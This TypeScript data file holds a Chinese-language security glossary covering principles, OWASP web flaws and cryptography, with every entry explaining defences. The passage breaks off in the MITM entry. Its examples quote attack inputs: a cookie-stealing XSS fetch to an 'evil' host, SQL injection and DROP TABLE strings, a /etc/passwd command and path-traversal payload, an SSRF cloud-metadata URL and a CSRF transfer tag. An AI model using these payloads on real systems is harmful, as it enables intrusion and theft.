import type { Term } from './types';

/** security 领域术语 · 第一部分（原则 / Web 安全 / 密码学 / 认证访问控制） */
export const SEC_SECURITY: Term[] = [
  {
    id: 'sec-cia',
    name: 'CIA 三元组',
    en: 'CIA Triad',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '基础'],
    summary: '安全的三大目标：机密性（不泄露）、完整性（不被篡改）、可用性（随时可用），一切安全措施都在为它们服务。',
    detail: `**是什么**：信息安全模型的基石，三个字母分别代表：

- **机密性（Confidentiality）**：数据只被授权者看到——加密、访问控制都在保护它
- **完整性（Integrity）**：数据不被未授权篡改——哈希校验、数字签名、审计日志为其服务
- **可用性（Availability）**：授权用户要用时系统能用——DDoS 防御、备份容灾、高可用架构为其服务

**为什么重要**：评估任何安全事件时先问"破坏了 CIA 的哪一角"。勒索软件同时破坏完整性与可用性；数据泄露破坏机密性；三者相互制约（极端加密易用性下降），安全方案就是在做平衡。

**实践要点**：设计新系统时，为每类数据标注 CIA 需求等级（如用户密码：C 极高 / A 一般），再据此选防护手段。`,
    relations: [
      { to: 'sec-defense-in-depth', desc: 'CIA 是目标，纵深防御是实现目标的分层手段' },
      { to: 'sec-ransomware', desc: '勒索软件同时破坏完整性与可用性的典型威胁' },
      { to: 'net-ddos', desc: 'DDoS 是针对可用性（A）最直接的攻击' },
      { to: 'net-https', desc: 'HTTPS 同时服务于机密性与完整性' },
    ],
    interview: '面试常问"如何为一个系统做安全需求分析"——答案骨架就是 CIA 分级 + 威胁建模。',
  },
  {
    id: 'sec-least-privilege',
    name: '最小权限原则',
    en: 'Least Privilege',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '权限'],
    summary: '每个用户、进程、服务只授予完成其职能所必需的最小权限，多余的权限就是多余的攻击面。',
    detail: `**是什么**：安全设计的黄金法则——数据库账号不需要 DROP 权限就不给；Web 服务进程不用 root 跑；CI 流水线的 token 只能读代码和推镜像，不能删库。

**为什么重要**：
- 权限越小，被攻陷后的**爆炸半径**越小：SQL 注入拿到只读账号 vs 拿到 DBA 账号，是"数据泄露"与"全库被删"的区别
- 减少**横向移动**：攻击者拿下一台低权限主机后，没有凭证就爬不上内网核心

**实践要点**：
- 服务间调用用细粒度 service account，不共享万能凭证
- 人用 RBAC 分角色，管理员操作走临时提权（Just-in-Time）+ 审计
- 定期做权限回收审计（离职、转岗、废弃服务）`,
    relations: [
      { to: 'sec-privesc', desc: '权限提升是攻击者突破最小权限约束的手段' },
      { to: 'be-rbac', desc: 'RBAC 是落地最小权限的常用授权模型' },
      { to: 'sec-iam', desc: 'IAM 体系负责最小权限的授予与回收' },
    ],
    interview: '结合实际案例回答：如"生产数据库为何禁用 root 远程登录"，体现原则落地能力。',
  },
  {
    id: 'sec-defense-in-depth',
    name: '纵深防御',
    en: 'Defense in Depth',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '架构'],
    summary: '不依赖单点防线，用多层相互独立的控制措施叠加防护——一层被突破，下一层仍能兜底。',
    detail: `**是什么**：中世纪城堡的思路——护城河、外墙、内墙、守卫层层设防。对应到 Web 应用：

1. 网络层：防火墙 / WAF 挡明显恶意流量
2. 应用层：输入校验、参数化查询、输出转义
3. 认证层：MFA、强会话管理
4. 数据层：加密存储、最小权限账号
5. 运维层：日志监控、告警响应、备份

**为什么重要**：任何单点防御都会失效（WAF 规则绕过、代码漏过滤）。独立多层意味着攻击者必须同时突破所有层，成本指数级上升；某层失效时其余层仍提供保护。

**实践要点**：层与层要**独立失效**——WAF 和代码过滤用不同机制；别把两层防御写成同一个 if。`,
    relations: [
      { to: 'sec-waf', desc: 'WAF 是纵深防御的外层之一' },
      { to: 'sec-zero-trust', desc: '零信任可视为纵深防御在身份维度上的延伸' },
      { to: 'sec-cia', desc: '纵深防御是保护 CIA 三元组的方法论' },
    ],
  },
  {
    id: 'sec-zero-trust',
    name: '零信任架构',
    en: 'Zero Trust',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '架构'],
    summary: '"永不信任，始终验证"——不因请求来自内网就信任它，每次访问都要求身份验证与授权。',
    detail: `**是什么**：对传统"城堡-护城河"模型（内网=可信）的革命。零信任认为：内网已被攻穿是常态假设，信任不取决于网络位置，而取决于**每次请求的身份、设备、上下文**。

**三大原则**：
1. 显式验证：每次访问都认证+授权（人、设备、服务都要身份）
2. 最小权限：按需临时授权，不给常驻宽权限
3. 假设已被攻破：微分段隔离，限制爆炸半径

**实践落地**：服务间 mTLS 双向认证、短期凭证替代长期密钥、每次 API 调用带身份令牌、设备健康检查。

**为什么重要**：远程办公与云化让"内网边界"名存实亡；VPN 一旦失陷攻击者即获整个内网信任——零信任把信任粒度从"网络"缩小到"单次请求"。`,
    relations: [
      { to: 'sec-least-privilege', desc: '最小权限是零信任的三大支柱之一' },
      { to: 'be-jwt', desc: 'JWT 等短期令牌是零信任"每次验证"的载体' },
      { to: 'net-vpn', desc: '传统 VPN 是零信任要替代的"一次信任全内网"模式' },
    ],
    interview: '能讲清"零信任 ≠ 一个产品，而是一种架构理念"是加分项。',
  },
  {
    id: 'sec-threat-modeling',
    name: '威胁建模',
    en: 'Threat Modeling',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '设计'],
    summary: '在设计阶段系统性地回答"谁会攻击我们、怎么攻击、我们防住了吗"，把安全左移到编码之前。',
    detail: `**是什么**：以攻击者视角审视系统的结构化方法。常用 **STRIDE** 分类法逐项过：

- **S**poofing（伪造身份）→ 认证机制？
- **T**ampering（篡改数据）→ 完整性校验？
- **R**epudiation（抵赖）→ 审计日志？
- **I**nformation Disclosure（信息泄露）→ 加密与权限？
- **D**enial of Service（拒绝服务）→ 限流与冗余？
- **E**levation of Privilege（提权）→ 授权校验？

**怎么做**：画数据流图（DFD）→ 标出信任边界 → 对每个跨界数据流套 STRIDE 找威胁 → 按风险排序 → 给出缓解措施。

**为什么重要**：需求阶段修一个设计缺陷的成本是上线后的百分之一；"先画图再编码"比"写完再扫漏洞"能发现根本性问题（如"这个内部接口居然无鉴权"）。`,
    relations: [
      { to: 'sec-attack-surface', desc: '威胁建模的对象就是攻击面上的每个入口' },
      { to: 'sec-secure-sdlc', desc: '威胁建模是 SDL 中设计阶段的核心活动' },
      { to: 'lc-tech-design', desc: '技术方案设计评审时应包含威胁建模产物' },
    ],
  },
  {
    id: 'sec-attack-surface',
    name: '攻击面',
    en: 'Attack Surface',
    cat: 'security',
    sub: '安全基本原则',
    tags: ['安全原则', '概念'],
    summary: '攻击者所有可能触碰系统的入口总和：对外接口、开放端口、依赖组件、甚至人，面越大越难防。',
    detail: `**是什么**：系统中所有可被攻击者利用的触点集合：

- **数字面**：HTTP 接口、开放端口、第三方依赖（供应链）、DNS 记录、遗留的测试接口
- **物理面**：可插 USB 的终端、机房门禁
- **社会面**：可被钓鱼的员工、可被社工的客服

**为什么重要**：防御资源有限，攻击面管理决定防守效率。一个被遗忘的 2015 年老接口、一个没人维护的内部后台，都是潜在的突破口——**你看不见的攻击面最危险**。

**实践要点**：
- 关闭不用的端口与服务，下线废弃接口（减面）
- API 网关统一收口，禁止服务私自对外暴露
- 用资产测绘工具定期盘点"我们到底暴露了什么"`,
    relations: [
      { to: 'sec-threat-modeling', desc: '威胁建模系统化梳理攻击面' },
      { to: 'sec-port-scan', desc: '端口扫描是攻击者从外部测绘你攻击面的手段' },
      { to: 'be-api-gateway', desc: 'API 网关是收敛攻击面的工程手段' },
    ],
  },
  {
    id: 'sec-sql-injection',
    name: 'SQL 注入',
    en: 'SQL Injection',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP', '注入'],
    summary: '用户输入被拼进 SQL 语句并改变其语义，攻击者可绕过登录、拖库甚至删库，Web 漏洞常年榜首。',
    detail: `**攻击原理**：代码把用户输入直接拼接进 SQL：

\`\`\`sql
-- 拼接后："SELECT * FROM users WHERE name='" + input + "'"
输入：' OR '1'='1
实际执行：SELECT * FROM users WHERE name='' OR '1'='1'  -- 恒真，全表返回
\`\`\`

进阶玩法：\`'; DROP TABLE users; --\`（堆叠注入）、\`' UNION SELECT password FROM admin --\`（联合查询拖库）。

**危害**：绕过认证、读取任意表、写 WebShell、删库——历年大型数据泄露的重要源头。

**防御（根本解只有一个）**：
1. **参数化查询 / 预编译**（用户输入永远当数据，不当代码）
2. ORM 天然参数化，但拼接 \`raw()\` 时照样中招
3. 最小权限数据库账号（哪怕注入也拖不走全库）
4. 输入校验是辅助，**绝不作为唯一防线**`,
    relations: [
      { to: 'be-rdbms', desc: '攻击对象就是关系型数据库的 SQL 引擎' },
      { to: 'be-orm', desc: 'ORM 的参数化是 SQL 注入的天然防御' },
      { to: 'sec-command-injection', desc: '同一族注入问题：用户输入进入解释器（SQL/Shell）的语义层' },
      { to: 'sec-least-privilege', desc: '最小权限数据库账号能大幅缩小注入危害' },
    ],
    example: `// ❌ 危险：字符串拼接
db.query("SELECT * FROM users WHERE name = '" + name + "'");

// ✅ 安全：参数化查询（? 占位符由驱动转义）
db.query("SELECT * FROM users WHERE name = ?", [name]);`,
    interview: '必考题。答出"参数化查询是唯一根治方案"并解释为什么转义不可靠（编码绕过），是基本功底。',
  },
  {
    id: 'sec-xss',
    name: '跨站脚本 XSS',
    en: 'Cross-Site Scripting',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP', '前端'],
    summary: '攻击者把恶意脚本注入页面，在其他用户的浏览器里执行，可盗 Cookie、伪造操作、劫持会话。',
    detail: `**攻击原理**：用户输入被原样渲染进 HTML/JS 上下文：

- **存储型**：恶意脚本存进数据库（如评论区 \`<script>fetch('//evil?c='+document.cookie)</script>\`），所有访问者中招——危害最大
- **反射型**：脚本藏在 URL 参数中，需诱导点击
- **DOM 型**：前端 JS 把不可信数据写进 \`innerHTML\`

**危害**：盗会话 Cookie、键盘记录、以受害者身份发请求（配合 CSRF 更强）、挂马。

**防御（分层）**：
1. **输出转义**：按 HTML/attr/JS/URL 上下文正确编码（进 HTML 正文转 \`< > &\`，进属性还要转引号）
2. **CSP**（Content-Security-Policy）：即使脚本被注入，浏览器也拒绝执行外域脚本
3. Cookie 加 \`HttpOnly\`（JS 读不到，偷不走会话）
4. 用框架默认转义（React/Vue 的 \`{}\` 插值），警惕 \`dangerouslySetInnerHTML\``,
    relations: [
      { to: 'fe-csp', desc: 'CSP 策略是 XSS 的浏览器级缓解' },
      { to: 'fe-dom', desc: 'DOM 型 XSS 污染的就是 DOM 操作入口' },
      { to: 'sec-csrf', desc: 'XSS 常与 CSRF 组合：偷到 Token 再伪造请求' },
      { to: 'sec-session-security', desc: 'HttpOnly Cookie 是 XSS 偷会话的直接防御' },
    ],
    example: `<!-- ❌ 危险：用户评论原样输出 -->
<div>\${comment}</div>

<!-- ✅ 安全：文本转义 + CSP -->
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
<!-- 响应头：Content-Security-Policy: default-src 'self' -->`,
    interview: '区分三种 XSS 类型与各自防御重点，能说出 HttpOnly 与 CSP 的配合是亮点。',
  },
  {
    id: 'sec-csrf',
    name: '跨站请求伪造 CSRF',
    en: 'Cross-Site Request Forgery',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP'],
    summary: '攻击者诱导已登录用户的浏览器向目标站发请求，浏览器自动带上 Cookie，以受害者身份执行操作。',
    detail: `**攻击原理**：利用的是"浏览器自动附带 Cookie"这一机制。受害者登录了银行 A，又打开了恶意页面 B，B 里藏着：

\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
\`\`\`

浏览器向 A 发请求时**自动带上 A 的会话 Cookie**——银行以为是受害者本人操作。

**关键认知**：CSRF 攻击者**看不到**响应（跨域限制），只能"盲发"写操作——所以读接口相对安全，**写操作**才是战场。

**防御**：
1. **CSRF Token**：表单嵌入随机 Token，服务端校验（攻击者跨域拿不到）
2. **SameSite Cookie**：\`SameSite=Lax/Strict\` 让跨站请求不带 Cookie（现代浏览器默认 Lax，已挡住大半）
3. 校验 \`Origin/Referer\` 头
4. 敏感操作二次确认（密码/验证码）`,
    relations: [
      { to: 'be-cookie-session', desc: 'CSRF 的根源是 Cookie 自动附带机制' },
      { to: 'sec-session-security', desc: 'SameSite 属性是会话安全的核心配置' },
      { to: 'sec-xss', desc: 'XSS 可直接读取页面内 Token，使 CSRF 防御失效' },
    ],
    example: `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax`,
    interview: '讲清"为什么 XSS 能击穿 CSRF Token 防御"体现深度：XSS 在同源上下文里能读到 Token。',
  },
  {
    id: 'sec-ssrf',
    name: '服务端请求伪造 SSRF',
    en: 'Server-Side Request Forgery',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP', '云安全'],
    summary: '诱导服务器向攻击者指定的（内网）地址发请求，借服务器之身探测内网、打元数据接口、打内部服务。',
    detail: `**攻击原理**：应用有"根据 URL 取内容"的功能（预览图片、导入链接、Webhook），用户提交 \`http://169.254.169.254/latest/meta-data/\`——这是云厂商的**元数据服务**，服务器会带着自己的云凭证去请求，攻击者直接拿到 IAM 临时密钥（多起云上重大泄露的元凶）。

其他玩法：\`http://localhost:6379/\` 打内网 Redis、\`file:///etc/passwd\` 读本地文件（配合协议支持）、探测内网存活主机。

**危害**：内网穿透、云凭证窃取（可导致整个云账号沦陷）、内部服务未授权访问。

**防御**：
1. **URL 白名单**：只允许既定域名与协议（禁 file/gopher/dict）
2. 禁止解析到**内网 IP 段**（DNS 解析后校验，防 DNS rebinding）
3. 云上开启元数据服务 v2（需 Token 头，SSRF 拿不到）
4. 出网走代理并限制目标，网络层微分段`,
    relations: [
      { to: 'sec-zero-trust', desc: '元数据凭证窃取后横向移动，零信任微分段能限制爆炸半径' },
      { to: 'be-api-gateway', desc: '统一出口与网关策略可限制服务端任意外发请求' },
      { to: 'sec-iam', desc: '短时效的云凭证与最小权限策略是 SSRF 的止损线' },
    ],
    interview: '云安全面试高频：讲出 169.254.169.254 的意义与 IMDSv2 缓解方案即证明有实战认知。',
  },
  {
    id: 'sec-command-injection',
    name: '命令注入',
    en: 'Command Injection',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', '注入'],
    summary: '用户输入被拼进系统 Shell 命令执行，攻击者可运行任意系统命令，危害通常比 SQL 注入更直接。',
    detail: `**攻击原理**：代码调用 Shell 执行外部程序并把用户输入拼进去：

\`\`\`js
// 功能：处理用户上传的图片
exec(\`convert \${input}.png out.png\`);
// 输入：a.png; cat /etc/passwd
// 实际执行：convert a.png; cat /etc/passwd .png
\`\`\`

Shell 把 \`;\` 解释为命令分隔符——攻击者附加的命令获得与原程序相同的权限（Web 进程权限有多大便有多大危害）。

相关变体：管道 \`|\`、反引号、\`&&\`、换行符都可以注入。

**防御**：
1. **能不调 Shell 就不调**：用语言原生 API/库替代（图像处理用 sharp 库而非 exec convert）
2. 必须调用时用 **execFile/参数数组**形式（不走 Shell 解析，\`; \` 只是普通字符）
3. 输入白名单校验（如文件名只允许 \`[a-zA-Z0-9.-]\`）
4. 以最小权限用户运行工作进程`,
    relations: [
      { to: 'sec-sql-injection', desc: '同属注入家族：用户数据被解释器当成代码' },
      { to: 'sec-least-privilege', desc: '低权限运行进程是命令注入的最后防线' },
      { to: 'sec-file-upload', desc: '文件上传名常成为命令注入的入口' },
    ],
    interview: '关键点：exec("cmd " + input) 与 execFile("cmd", [input]) 的本质区别（是否经过 Shell 解释）。',
  },
  {
    id: 'sec-file-upload',
    name: '文件上传漏洞',
    en: 'File Upload Vulnerabilities',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP'],
    summary: '上传功能校验不严，让攻击者传上 WebShell、恶意脚本或超大文件，占服务器、拿权限、传病毒。',
    detail: `**攻击原理与常见绕过**：

1. **后缀绕过**：只校验 \`.jpg\` 后缀？用 \`shell.php.jpg\`、大小写 \`_.JSP\`、双写
2. **Content-Type 伪造**：客户端声明的 MIME 类型完全可伪造
3. **文件内容伪装**：\`GIF89a\` 头 + 脚本代码，绕过文件头检测
4. **路径穿越**：文件名 \`../../etc/cron.d/evil\` 写到任意目录
5. **解析漏洞**：Nginx \`/upload/x.jpg/.php\` 把图片当脚本执行

**危害**：WebShell 直接拿服务器权限（配合命令注入等于完全沦陷）。

**防御清单**：
- 白名单后缀 + 服务端魔数（magic bytes）校验
- **重命名**为随机文件名 + 固定无执行权限的存储目录
- 上传与 Web 服务分离（对象存储/独立域名）
- 限制大小、做病毒扫描、图片再编码（抹掉附带载荷）`,
    relations: [
      { to: 'sec-command-injection', desc: '上传文件名是命令注入的经典入口' },
      { to: 'sec-path-traversal', desc: '路径穿越决定恶意文件被写到哪' },
      { to: 'sec-malware', desc: '上传通道也是恶意软件传播途径' },
    ],
  },
  {
    id: 'sec-deserialization',
    name: '不安全反序列化',
    en: 'Insecure Deserialization',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP'],
    summary: '反序列化不可信数据时触发对象构造逻辑，可被构造成任意代码执行，Java/PHP/Python 均有著名案例。',
    detail: `**攻击原理**：序列化把对象变成字节流存储/传输，反序列化时自动调用构造/魔术方法。攻击者篡改字节流，让还原过程执行"魔术方法"里的逻辑——配合应用 classpath 中已有的" gadgets 调用链"，最终形成**远程代码执行**。

著名案例：Java Apache Commons-Collections 链（Weblogic/JBoss 大量沦陷）、PHP \`unserialize()\` 的 \`__wakeup/__destruct\` 利用、Python pickle 反序列化。

**危害**：RCE（最高危）、鉴权绕过（篡改序列化后的权限字段）、DoS。

**防御**：
1. **永不反序列化不可信数据**——优先用 JSON 等纯数据格式（JSON 反序列化不执行代码）
2. 必须用原生序列化时：白名单类（Java look-ahead 校验）、完整性签名保护字节流
3. 升级含已知 gadget 链的组件`,
    relations: [
      { to: 'sec-supply-chain', desc: '含 gadget 链的组件属于供应链风险' },
      { to: 'sec-cve-cvss', desc: '反序列化 RCE 漏洞在 CVSS 中几乎都是 9 分以上' },
      { to: 'sec-hash-function', desc: '对序列化数据做 HMAC 签名可检测篡改' },
    ],
  },
  {
    id: 'sec-path-traversal',
    name: '目录穿越',
    en: 'Path Traversal',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', 'OWASP'],
    summary: '利用 ../ 序列绕过目录限制读写任意文件，可窃取配置、密码文件，甚至写入 WebShell。',
    detail: `**攻击原理**：文件路径由用户输入拼接，未归一化校验：

\`\`\`
下载接口：/download?file=report.pdf
攻击：    /download?file=../../../../etc/passwd
实际读取：/var/www/app/../../../../etc/passwd → /etc/passwd
\`\`\`

绕过技巧：URL 编码 \`%2e%2e%2f\`、双重编码 \`%252e\`、绝对路径直接注入、Windows 的 \`..\\\\\`。

**危害**：读源码与配置（数据库密码、密钥）、读系统口令文件、配合上传功能把文件写到任意位置（如 cron 目录）实现 RCE。

**防御**：
1. **不用用户输入拼路径**——用 ID 映射到服务端文件（\`fileId=123\` → 查表得路径）
2. 必须用文件名时：先归一化（realpath）再校验必须位于基目录内（前缀检查）
3. 白名单后缀、服务进程最小文件权限`,
    relations: [
      { to: 'sec-file-upload', desc: '上传 + 穿越组合可实现任意文件写入' },
      { to: 'sec-least-privilege', desc: '进程文件系统权限是最小化危害的兜底' },
    ],
  },
  {
    id: 'sec-clickjacking',
    name: '点击劫持',
    en: 'Clickjacking',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', '前端'],
    summary: '攻击者用透明 iframe 覆盖在诱饵页面上，受害者的点击实际落在看不见的目标按钮上。',
    detail: `**攻击原理**：攻击者页面把目标网站（如"删除账号"页）用 \`<iframe>\` 嵌入并设为完全透明，上面覆盖一个吸引人的"抽奖"按钮。用户点击"抽奖"时，实际点到的是透明 iframe 里的"确认删除"。也可用鼠标轨迹劫持实现连续操作（拖拽劫持）。

**危害**：诱导转账、点赞关注、改设置、授权 OAuth 应用——凡是"点一下就生效"的操作都可被劫持。

**防御**：
1. **X-Frame-Options: DENY / SAMEORIGIN**——禁止被 iframe 嵌入（老牌方案，浏览器支持好）
2. **CSP frame-ancestors 'none'**——CSP 版本，能力更强（可指定白名单父页面）
3. 敏感按钮加二次确认（部分缓解，非根治）
4. JS 框架检测（top !== self 时报警）——可被某些手段绕过，只作辅助`,
    relations: [
      { to: 'sec-security-headers', desc: 'X-Frame-Options 与 frame-ancestors 都是安全响应头' },
      { to: 'sec-csrf', desc: '同为"借用户之手"的攻击，一个伪造请求一个伪造点击' },
    ],
  },
  {
    id: 'sec-security-headers',
    name: 'HTTP 安全响应头',
    en: 'HTTP Security Headers',
    cat: 'security',
    sub: 'Web 安全 OWASP',
    tags: ['Web安全', '加固'],
    summary: '一组由服务端下发的响应头，指示浏览器启用安全策略——成本低、见效快的基础加固手段。',
    detail: `**常用的七个头**：

| 头 | 作用 |
| --- | --- |
| \`Content-Security-Policy\` | 限制脚本/样式来源，XSS 的浏览器级防线 |
| \`X-Frame-Options\` / \`frame-ancestors\` | 防点击劫持 |
| \`Strict-Transport-Security\` (HSTS) | 强制 HTTPS，防降级与剥离攻击 |
| \`X-Content-Type-Options: nosniff\` | 禁止 MIME 嗅探，防文件被当脚本执行 |
| \`Referrer-Policy\` | 控制引荐信息泄露 |
| \`Permissions-Policy\` | 收敛摄像头/麦克风等能力授权 |
| \`Cross-Origin-Opener-Policy\` 等 COOP/COEP | 跨域窗口隔离 |

**实践要点**：安全头是**纵深防御的外层**——不能替代代码层修复，但能在漏洞被找到前挡住大量自动化攻击。用 securityheaders.com 扫描评级（A+ 是合格线）。

**CSP 注意**：内联脚本需 nonce/hash 白名单；配得太松（如 \`unsafe-inline\`）等于没配。`,
    relations: [
      { to: 'fe-csp', desc: 'CSP 策略细节在前端领域有完整讲解' },
      { to: 'net-https', desc: 'HSTS 建立在 HTTPS 之上强制加密' },
      { to: 'sec-clickjacking', desc: 'frame-ancestors 是点击劫持的根治方案' },
    ],
    example: `# nginx 安全头最小集
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000" always;`,
  },
  {
    id: 'sec-symmetric-encryption',
    name: '对称加密',
    en: 'Symmetric Encryption',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '加密'],
    summary: '加密与解密用同一把密钥，速度快适合大数据量；核心难题是密钥如何安全送达对方。',
    detail: `**是什么**：一把密钥既加密又解密。现代标准是 **AES**（128/256 位），流密码场景用 ChaCha20-Poly1305。

**两大工作模式要分清**：
- **ECB（电码本）**：相同明文块加密结果相同——会泄露模式，**禁用**（著名的"加密后企鹅仍可见"图）
- **GCM / CBC+随机 IV**：带认证的 GCM 是当前首选（同时保完整性）

**核心难题——密钥分发**：通信双方怎么在不安全信道上先把密钥给对方？这正是非对称加密（或 DH 密钥交换）解决的问题；HTTPS 的做法是：非对称交换出会话密钥，之后大数据量用对称加密（各取所长）。

**实践要点**：密钥不放代码/仓库，用 KMS 或环境变量注入；IV 必须随机且不复用。`,
    relations: [
      { to: 'sec-asymmetric-encryption', desc: '非对称加密解决对称密钥的分发难题' },
      { to: 'net-https', desc: 'HTTPS 会话数据实际由对称加密承载' },
      { to: 'sec-e2e-encryption', desc: '端到端加密的报文本体也是对称加密' },
    ],
    interview: '能讲出"HTTPS 握手用非对称、传输用对称"的混合架构原因（性能），即掌握本质。',
  },
  {
    id: 'sec-asymmetric-encryption',
    name: '非对称加密',
    en: 'Asymmetric Encryption',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '加密'],
    summary: '公钥加密、私钥解密的成对密钥体系，解决密钥分发问题，是 HTTPS/SSH/签名的基石。',
    detail: `**是什么**：每人生成一对密钥——**公钥**随便发、**私钥**绝不外泄。别人用你的公钥加密，只有你的私钥能解。基于数学难题（大数分解 → RSA；椭圆曲线离散对数 → ECC）。

**两大用途**：
1. **加密小数据 / 交换密钥**：用对方公钥加密对称会话密钥
2. **数字签名**：私钥签名、公钥验签（与加密方向相反！）

**注意与哈希的关系**：签名实际是"先对内容做哈希，再对哈希值用私钥加密"——哈希保完整、私钥保来源。

**代价**：比对称加密慢百倍以上，只适合小块数据。所以 TLS 握手阶段用它，数据传输切换到对称。

**私钥管理**：私钥泄露 = 身份全部沦陷（可签发任何假凭证）。用 HSM/KMS 托管、轮换与吊销机制兜底。`,
    relations: [
      { to: 'sec-digital-signature', desc: '签名是非对称密码学的"反向"应用' },
      { to: 'sec-pki-cert', desc: 'PKI 体系负责公钥的可信分发' },
      { to: 'sec-symmetric-encryption', desc: '两者在 HTTPS 中混合使用各司其职' },
    ],
  },
  {
    id: 'sec-hash-function',
    name: '密码学哈希函数',
    en: 'Cryptographic Hash Function',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '哈希'],
    summary: '任意输入映射为固定长度"指纹"：单向、抗碰撞、雪崩效应——完整性校验与密码存储的基础。',
    detail: `**三大性质**：
1. **单向性**：从哈希值反推原文不可行
2. **抗碰撞性**：找不到两个不同输入有相同哈希
3. **雪崩效应**：改一个 bit，输出天翻地覆

**算法现状**：MD5 / SHA-1 **已破**（可构造碰撞），仅用于非安全校验；安全场景用 **SHA-256/512**（SHA-2 家族）或 SHA-3。

**两大应用方向，要求截然不同**：
- **完整性校验 / 签名预处理**：追求快 → SHA-256 直接用
- **密码存储**：追求**慢** → 快哈希反而帮攻击者（GPU 每秒可算上百亿次），必须用 bcrypt/scrypt/Argon2 这类**刻意缓慢、自带盐**的慢哈希

**坑**：哈希不加密——它不可逆，也无法恢复原文；"我们的数据库密码是哈希的，找回功能是把哈希解回来"这句话本身就是事故。`,
    relations: [
      { to: 'sec-password-storage', desc: '密码存储必须用慢哈希而非普通哈希' },
      { to: 'sec-digital-signature', desc: '签名先哈希原文再加密哈希值' },
      { to: 'sec-ransomware', desc: '备份完整性可用哈希校验，防篡改式勒索' },
    ],
    interview: '经典追问链：为什么密码不能 MD5 → 为什么 MD5+盐也不够 → bcrypt/Argon2 慢在哪（成本因子）。',
  },
  {
    id: 'sec-digital-signature',
    name: '数字签名',
    en: 'Digital Signature',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', '签名'],
    summary: '私钥对内容哈希签名、公钥验证——同时证明完整性、来源真实性与不可否认性。',
    detail: `**流程**：
1. 发送方对内容计算哈希
2. 用**私钥**加密哈希值 → 得到签名
3. 接收方用**公钥**解出哈希，与自算哈希比对 → 一致则通过

**提供三重保证**：
- **完整性**：内容被改一个字节，哈希比对即失败
- **来源认证**：只有私钥持有者能生成有效签名
- **不可否认性**：签名者无法抵赖（这是对称 MAC 做不到的——双方共享密钥，第三方无法仲裁）

**应用场景**：软件发布签名（防供应链篡改）、JWT 的签名部分、Git 提交签名、TLS 证书、区块链交易。

**信任根基**：验签用的公钥必须可信——否则攻击者发自己的公钥冒充对方。这个"公钥属于谁"的问题由 PKI/证书体系解决。`,
    relations: [
      { to: 'sec-pki-cert', desc: 'PKI 证书链回答"这把公钥真的属于他吗"' },
      { to: 'sec-asymmetric-encryption', desc: '签名是非对称密码学的反向应用' },
      { to: 'sec-supply-chain', desc: '软件包签名是供应链攻击的核心防线' },
      { to: 'sec-hash-function', desc: '签名的对象是内容的哈希' },
    ],
  },
  {
    id: 'sec-pki-cert',
    name: '证书与 PKI',
    en: 'PKI & Certificates',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['密码学', 'PKI', '证书'],
    summary: '由可信 CA 签发证书链，把"公钥"与"身份"绑定，回答加密体系里最根本的问题：这把公钥属于谁。',
    detail: `**要解决的问题**：非对称加密中，你怎么知道手里的"银行公钥"真是银行的？——中间人可以把**自己的**公钥发给你。PKI（公钥基础设施）的答案：引入**可信第三方 CA**。

**证书内容与信任链**：证书 = 域名/身份 + 公钥 + 有效期 + CA 签名。浏览器预置了根 CA 公钥 → 验证中间 CA 证书 → 再验证站点证书，形成**信任链**。

**关键机制**：
- **域名验证（DV/EV）**：CA 签发前核验申请者控制该域名
- **吊销**：私钥泄露后证书要作废（CRL / OCSP 实时查询）
- **证书透明度（CT）**：所有签发记录公开可查，防 CA 乱签
- **Let's Encrypt**：免费自动化签发，让全站 HTTPS 成为常态

**事故教训**：CA 被攻破或违规签发（如 DigiNotar 事件）会动摇整个信任体系——根证书也可能被吊销。`,
    relations: [
      { to: 'net-https', desc: 'HTTPS 的浏览器小锁就是证书链验证通过' },
      { to: 'sec-mitm', desc: 'PKI 是中间人攻击的根本性防御' },
      { to: 'sec-digital-signature', desc: '证书本质是被 CA 签名的公钥' },
    ],
  },
  {
    id: 'sec-mitm',
    name: '中间人攻击 MITM',
    en: 'Man-in-the-Middle',
    cat: 'security',
    sub: '密码学与应用',
    tags: ['攻击', '网络'],
    summary: '攻击者潜伏在通信双方之间转发并窃听/篡改流量，HTTP 明文与无验证加密均可被截胡。',
    detail: `**攻击场景**：
- **公共 WiFi**：攻击者架同名热点，流量全过他手——明文 HTTP 的账号密码直接可见
- **ARP 欺骗 / DNS 劫持**：在内网或运营商链路上把你引到假服务器
- **SSL 剥离**：把你的 HTTPS 请求降级成 HTTP（所以需要 HSTS）
- **假证书**：给浏览器一个"银行"的自签证书——除非用户点掉告警

**危害**：窃听凭据、篡改注入（运营商插广告即是温和版 MITM）、会话劫持。

**防御体系**：
1. **全站 HTTPS + HSTS**（防降级）
2. **证书链校验 + 证书固定**（App 内置期望公钥）
3. 内网服务间 **mTLS** 双向认证
4. 不在公共 WiFi 做敏感操作，或全程走可信 VPN`,
    relations: [
      { to: 'net-https', desc: 'HTTPS+证书校验是 MITM 的根本防御' },
      { to: 'sec-arp-spoofing', desc: 'ARP 欺骗是把流量引到攻击者的前置手段' },
